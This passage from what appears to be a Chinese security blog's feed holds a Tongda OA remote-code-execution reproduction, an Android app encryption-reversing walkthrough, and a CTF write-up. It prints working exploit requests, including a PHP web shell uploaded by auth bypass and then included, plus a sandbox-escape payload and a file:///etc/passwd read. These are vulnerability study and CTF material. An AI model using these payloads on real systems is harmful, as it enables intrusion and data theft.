class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">POST /ispirit/im/upload.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.235</span><span class="number">.7</span></span><br><span class="line">Content-Length: <span class="number">656</span></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">80.0</span><span class="number">.3987</span><span class="number">.132</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=123</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name="UPLOAD_MODE"</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name="P"</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">123</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name="DEST_UID"</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"</span></span><br><span class="line"><span class="comment">Content-Type: image/jpeg</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment">$command=$_POST['cmd'];</span></span><br><span class="line"><span class="comment">$wsh = new COM('WScript.shell');</span></span><br><span class="line"><span class="comment">$exec = $wsh-&gt;exec("cmd /c ".$command);</span></span><br><span class="line"><span class="comment">$stdout = $exec-&gt;StdOut();</span></span><br><span class="line"><span class="comment">$stroutput = $stdout-&gt;ReadAll();</span></span><br><span class="line"><span class="comment">echo $stroutput;</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span></span><br></pre></td></tr></table></figure><p><code>/ispirit/interface/gateway.php</code> 存在文件包含漏洞，包含刚刚所上传的文件（<code>/general/../../attach/im/</code> 为默认路径，<code>2012/969649651.jpg</code> 为上图获得的文件名和目录名），包含文件从而执行命令。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%201.png" alt="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled 1.png"></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /ispirit/interface/gateway.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.235</span><span class="number">.7</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">84.0</span><span class="number">.4147</span><span class="number">.105</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=v73r3edjd8hk4n6vuiuv3itsp5; KEY_RANDOMDATA=2283</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 66</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">json=&#123;"url":"/general/../../attach/im/2012/969649651.jpg"&#125;&amp;cmd=dir</span></span><br></pre></td></tr></table></figure><h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>直接打开php源码头部，带有Zend关键字。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%202.png" alt="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%202.png"></p><p>通过Zend在线解密php代码<a href="http://dezend.qiling.org/free/" target="_blank" rel="noopener">http://dezend.qiling.org/free/</a></p><p>查看第4行至13行，<code>p</code>参数不为空即可绕过身份验证。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%203.png" alt="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%203.png"></p><p>如下图<code>DEST_UID</code> 参数不为0，即可进入<code>inc/utility_file.php</code>中的<code>upload</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%204.png" alt="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%204.png"></p><p>如下图upload函数，会进入is_uploadable函数验证后缀是否为php</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%205.png" alt="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%205.png"></p><p>如下验证是否为php后缀，可通过php.绕过验证，但是默认不存储在wwwroot中，所以没用</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%206.png" alt="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%206.png"></p><p>构造文件上传poc，<code>p</code>不为空，<code>upload_mode</code>为2，<code>DEST_UID</code>不为0，文件名参数为<code>ATTACHMENT</code></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">POST /ispirit/im/upload.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.235</span><span class="number">.7</span></span><br><span class="line">Content-Length: <span class="number">656</span></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">80.0</span><span class="number">.3987</span><span class="number">.132</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=123</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name="UPLOAD_MODE"</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name="P"</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">123</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name="DEST_UID"</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"</span></span><br><span class="line"><span class="comment">Content-Type: image/jpeg</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment">$command=$_POST['cmd'];</span></span><br><span class="line"><span class="comment">$wsh = new COM('WScript.shell');</span></span><br><span class="line"><span class="comment">$exec = $wsh-&gt;exec("cmd /c ".$command);</span></span><br><span class="line"><span class="comment">$stdout = $exec-&gt;StdOut();</span></span><br><span class="line"><span class="comment">$stroutput = $stdout-&gt;ReadAll();</span></span><br><span class="line"><span class="comment">echo $stroutput;</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span></span><br></pre></td></tr></table></figure><p><code>/ispirit/interface/gateway.php</code> 存在文件包含漏洞</p><p><code>p</code>为空即可绕过身份认证，如下可知，可从json中获取url参数的值</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%207.png" alt="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%207.png"></p><p>如下38行需校验传递参数中是否包含<code>general/、ispirit/、module/</code> ，如果包含url参数的值即可执行include_once，从而文件包含</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%208.png" alt="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%208.png"></p><p>如下图，成功成功文件包含并代码执行</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%209.png" alt="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%209.png"></p><blockquote><p>网上有很多复现的文章，但是如果是为了学习的话最好还是自己通读一边代码。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;&lt;strong&gt;漏洞复现&lt;/strong&gt;&lt;/h1&gt;&lt;h3 id=&quot;影响版本：&quot;&gt;&lt;a href=&quot;#影响版本：&quot; class=&quot;headerlin
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JEB_Debug_Encrypt(1)</title>
    <link href="https://vuln.top/2020/09/16/JEB_Debug_Encrypt/"/>
    <id>https://vuln.top/2020/09/16/JEB_Debug_Encrypt/</id>
    <published>2020-09-16T04:11:34.000Z</published>
    <updated>2020-09-20T14:36:13.180Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JEB-动态调试-加密"><a href="#JEB-动态调试-加密" class="headerlink" title="JEB 动态调试 加密"></a>JEB 动态调试 加密</h1><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><strong><em>JEB3</em></strong></p><p><strong><em>BurpSuite</em></strong></p><p><strong><em>Genymotion</em></strong></p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>先准备一个模拟器或安卓手机，配置好<code>BurpSuite</code>代理，可以抓取到如下数据包，Request和Response都已加密。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled.png"></p><p>用Jeb3打开Apk，进入Bytecode菜单，点击下方的字符串，搜索<code>dataStr</code>双击进入。（为啥要搜索它? 因为它在提交数据中是个协议头, 添加这些参数的时候想必都会在一个代码块, 所以加密函数也可能在附近。）</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%201.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%201.png"></p><p>进入后我们可以看到<code>smali</code>代码，在可疑的地方通过Ctrl+b可以下断点进行调试。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%202.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%202.png"></p><p>模拟器内需要先打开APP，然后点击上方虫子按钮，可以看到如下图所示，点击附上。</p><p>注意: 如果附加和调试对话框中没有模拟器的话, 你需要将模拟器目录下的adb.exe路径添加进系统环境变量path中, 如果已经添加却无法搜索到, 打开任务管理器结束adb.exe进程, 重启模拟器应该就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%203.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%203.png"></p><p>在模拟器内点击登陆后，JEB模拟器右上方VM/局部变量会增加几个值，但是我们无法直接看懂。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%204.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%204.png"></p><p>我们需要修改Type类型，从int改为<code>string</code>，修改后我们可以看到变量当前处在内存中的值，F6可以进行单步调试，局部变量的值也会随之改变。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%205.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%205.png"></p><p>我们已经了解了如何进行断点调试，通过分析java代码看下整个的加密过程</p><p>dataStr是我们的加密字符串，先是调用了getEncodeJsonStr，双击进入看一下</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%206.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%206.png"></p><p>arg6是我们传入的值，我们设置断点看一下</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%207.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%207.png"></p><p>如下图可以看到v6是我们传入的数据进行了json转换，那么我们只要跟着v6走就能找到加密过程。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%208.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%208.png"></p><p>我们继续往下，v6传入了encodeMesJsonByPassword中，传入了4个值分别为Token，requestAesKey，v6，TERMINAL_TYPE</p><p>如下图Token是#@!1234567890!@#，requestAesKey是1234567890123456，v6是json格式的明文</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%209.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%209.png"></p><p>TERMINAL_TYPE还不知道我们双击进去，是afAndriod</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2010.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2010.png"></p><p>几个变量都知道了那我们双击进入encodeMesJsonByPassword函数，可以看到v2是一个随机的AesSecretKey，将等于过滤为空，先不管他。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2011.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2011.png"></p><p>如下图signature=md5(terminalType+token+timestamp)，terminalType=afAndriod、token=#@!1234567890!@#、timestamp为一个随机值，暂时无法构造。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2012.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2012.png"></p><p>继续往下看arg6，将&amp;timestamp=xxx+&amp;signature=xxx进行了一次base64，和上面的arg6一起进入encryptPinfo函数。上面的arg6为requestAesKey=1234567890123456</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2013.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2013.png"></p><p>接着进入encryptPinfo函数，arg3=base64(&amp;timestamp=xxx+&amp;signature=xxx),arg4=1234567890123456,看下加密发现是AES/CBC/PKCS5Padding加密。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2014.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2014.png"></p><p>有了KEY，我们需要找到IV，点击进入IsIvParameter_Pinfo，如下图Iv值为0123456789abcdef</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2015.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2015.png"></p><p>有了IV和KEY，还有加密算法我们需要对加密字符串进行解密，通过在线AES解密即可得到。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2016.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2016.png"></p><p>在进行一次base64，获得明文</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2017.png" alt="https://cdn.jsdelivr.net/gh/H1dery/h1dery/uPic/Untitled%2017.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JEB-动态调试-加密&quot;&gt;&lt;a href=&quot;#JEB-动态调试-加密&quot; class=&quot;headerlink&quot; title=&quot;JEB 动态调试 加密&quot;&gt;&lt;/a&gt;JEB 动态调试 加密&lt;/h1&gt;&lt;h2 id=&quot;工具&quot;&gt;&lt;a href=&quot;#工具&quot; class=&quot;head
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019神盾杯</title>
    <link href="https://vuln.top/2020/08/23/2019shendun/"/>
    <id>https://vuln.top/2020/08/23/2019shendun/</id>
    <published>2020-08-22T23:11:50.000Z</published>
    <updated>2020-08-23T07:37:09.170Z</updated>
    
    <content type="html"><![CDATA[<p><strong>首届“神盾杯”上海市网络安全竞赛</strong>，去年的比赛。</p><h1 id="0x00-babyJS"><a href="#0x00-babyJS" class="headerlink" title="0x00 babyJS"></a>0x00 babyJS</h1><p><strong>操作内容：</strong></p><p>查看源码 找不到被调用的CheckLogin函数</p><p><img src="https://vuln.top/2020/08/23/2019shendun///image1.png" alt="https://vuln.top/2020/08/23/2019shendun/image1.png"></p><p>看到script中有用到unespace和escape等函数 用于编码字符串</p><p>将eval传参改为alert 显示为弹窗</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image2.png" alt="https://vuln.top/2020/08/23/2019shendun/image2.png"></p><p>发现check函数 并将flag与用户输入做比较 得到flag</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image3.png" alt="https://vuln.top/2020/08/23/2019shendun/image3.png"></p><p><strong>FLAG值：</strong></p><p><strong>flag{a5a5f402f6dc62acd3e848900a17513f}</strong></p><h1 id="0x01-crypto-easy-1"><a href="#0x01-crypto-easy-1" class="headerlink" title="0x01 crypto_easy_1"></a>0x01 crypto_easy_1</h1><p><strong>操作内容：</strong></p><p>下载文件</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image4.png" alt="https://vuln.top/2020/08/23/2019shendun/image4.png"></p><p>发现3行类似的数据 并且长度一致。</p><p>:左边的长度为42 右边的长度为56 ，猜测右边被base64编码过 进行解码 比较长度</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image5.png" alt="https://vuln.top/2020/08/23/2019shendun/image5.png"></p><p>长度一致 为42</p><p>异或运算一下 可以得到Key随后将key代入 与base64解码后的密文异或比较 得到flag</p><p>解密脚本如下:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">c1 = <span class="string">'v6"wo5UIP9c4IdCk1o6qZhhB5DKZhVBwBzONl1JRIz'</span></span><br><span class="line"></span><br><span class="line">d1 = <span class="string">'zjS0ubQE2hw29FL2qs61ZNOVyFaf6IAjUZ7X8ijuVg'</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="string">'Twd2RyZYBCEVbjBjID17UkUeeDAwPBh1dg86AyAgcSQ4QygYGnAuJQYw'</span></span><br><span class="line"></span><br><span class="line">d2 = <span class="string">'SXwmSRMdBz0LJwARAGkObhg6CSo5ZCVcIn0LLnkFfRAiGw9kAzM1GDYt'</span></span><br><span class="line"></span><br><span class="line">dum_c2 = base64.b64decode(c2)</span><br><span class="line"></span><br><span class="line"># print dum_c2</span><br><span class="line"></span><br><span class="line">dum_d2 = base64.b64decode(d2)</span><br><span class="line"></span><br><span class="line"># print dum_d2</span><br><span class="line"></span><br><span class="line">key1 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c1)):</span><br><span class="line"></span><br><span class="line">key1 += chr(ord(c1[i])^ord(dum_c2[i]))</span><br><span class="line"></span><br><span class="line">print <span class="string">"key1 = "</span>+key1</span><br><span class="line"></span><br><span class="line">key2 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(d1)):</span><br><span class="line"></span><br><span class="line">key2 += chr(ord(d1[j])^ord(dum_d2[j]))</span><br><span class="line"></span><br><span class="line">print <span class="string">"key2 = "</span>+key2</span><br><span class="line"></span><br><span class="line">flag_enc = <span class="string">'X1o1VzIPaVgjbmNvCnQAC0ZHY3BbMUkaeylDYWVOCzZDXwJjR3hTFiw3'</span></span><br><span class="line"></span><br><span class="line">flag_enc_dum = base64.b64decode(flag_enc)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(flag_enc_dum)):</span><br><span class="line"></span><br><span class="line">flag += chr(ord(flag_enc_dum[j])^ord(key1[j]))</span><br><span class="line"></span><br><span class="line">print <span class="string">"flag = "</span>+flag</span><br></pre></td></tr></table></figure><p><strong>FLAG值：</strong></p><p><strong>flag{b80f908c-8226-11e9-8b28-88e9fe5197ac}</strong></p><h1 id="0x02-ez-gallery-1"><a href="#0x02-ez-gallery-1" class="headerlink" title="0x02 ez_gallery_1"></a>0x02 ez_gallery_1</h1><p><strong>操作内容：</strong></p><p>查看源码</p><p>提示flag位置</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image6.png" alt="https://vuln.top/2020/08/23/2019shendun/image6.png"></p><p>找到可以利用的url</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image7.png" alt="https://vuln.top/2020/08/23/2019shendun/image7.png"></p><p>使用?截断1.jpg</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image8.png" alt="https://vuln.top/2020/08/23/2019shendun/image8.png"></p><p><strong>FLAG值：</strong></p><p><strong>flag{378346c7ac53d624a8621efc745bbeab}</strong></p><p><strong>0x03 fast_calc_2</strong></p><p><strong>操作内容：</strong></p><p>随便试了几下{1+1},{set},发现有点奇怪,猜测可能是python逃逸</p><p>尝试dir(().<strong>class</strong>)</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image9.png" alt="https://vuln.top/2020/08/23/2019shendun/image9.png"></p><p>尝试了一下网上的payload但是没有成功，发现存在过滤，过滤了<code>[]</code></p><p>查到builtins是自动引入环境的<strong>builtins</strong>.<strong>dict</strong></p><p><img src="https://vuln.top/2020/08/23/2019shendun/image10.png" alt="https://vuln.top/2020/08/23/2019shendun/image10.png"></p><p>查找资料通过pop绕过[]</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image11.png" alt="https://vuln.top/2020/08/23/2019shendun/image11.png"></p><p>Payload为：<strong>builtins</strong>.<strong>dict</strong>.pop(‘open’)(‘/flag’).readline()</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image12.png" alt="https://vuln.top/2020/08/23/2019shendun/image12.png"></p><p><strong>FLAG值：</strong></p><p><strong>flag{4582900a19a6a8801399afb6a31d9bc0}</strong></p><h1 id="0x04-Easyadmin"><a href="#0x04-Easyadmin" class="headerlink" title="0x04 Easyadmin"></a>0x04 Easyadmin</h1><p><strong>操作内容：</strong></p><p>爆破下目录发现index.php~存在源码</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image13.png" alt="https://vuln.top/2020/08/23/2019shendun/image13.png"></p><p>发现srole==admin才能输出flag</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image14.png" alt="https://vuln.top/2020/08/23/2019shendun/image14.png"></p><p>登陆的后发现token为base64加密，解一下</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image15.png" alt="https://vuln.top/2020/08/23/2019shendun/image15.png"></p><p><img src="https://vuln.top/2020/08/23/2019shendun/image16.png" alt="https://vuln.top/2020/08/23/2019shendun/image16.png"></p><p>搜索了一下jwt发现有加密，网上有类似的解法</p><p>下面网站可以验证</p><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p><p><img src="https://vuln.top/2020/08/23/2019shendun/image17.png" alt="https://vuln.top/2020/08/23/2019shendun/image17.png"></p><p>有根据源码把guest改为admin</p><p>再看下源码，里面有一个key我们不知道，猜测需要爆破应该为4位</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image18.png" alt="https://vuln.top/2020/08/23/2019shendun/image18.png"></p><p>在github上找到一个脚本直接跑出来了<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a></p><p><img src="https://vuln.top/2020/08/23/2019shendun/image19.png" alt="https://vuln.top/2020/08/23/2019shendun/image19.png"></p><p>保存下‘sjwt’</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image20.png" alt="https://vuln.top/2020/08/23/2019shendun/image20.png"></p><p>用这个新token替换一下成功获取flag</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image21.png" alt="https://vuln.top/2020/08/23/2019shendun/image21.png"></p><p><strong>FLAG值：</strong></p><p><strong>flag{11529a36dd607c45e5b104ed977247ed}</strong></p><h1 id="0x05-Easyupload"><a href="#0x05-Easyupload" class="headerlink" title="0x05 Easyupload"></a>0x05 Easyupload</h1><p><strong>操作内容：</strong></p><p>通过尝试发现在图片地址处输入 <a href="file:///etc/passwd" target="_blank" rel="noopener">file:///etc/passwd</a>可以读到文件</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image22.png" alt="https://vuln.top/2020/08/23/2019shendun/image22.png"></p><p><img src="https://vuln.top/2020/08/23/2019shendun/image23.png" alt="https://vuln.top/2020/08/23/2019shendun/image23.png"></p><p>然后在这卡了好久，在摸索后发现可以通过用/proc/self/cwd绕过，cwd是一个符号链接，指向了实际的工作目录</p><p>下图是一篇文章中的介绍</p><p><img src="https://vuln.top/2020/08/23/2019shendun/image24.png" alt="https://vuln.top/2020/08/23/2019shendun/image24.png"></p><p><img 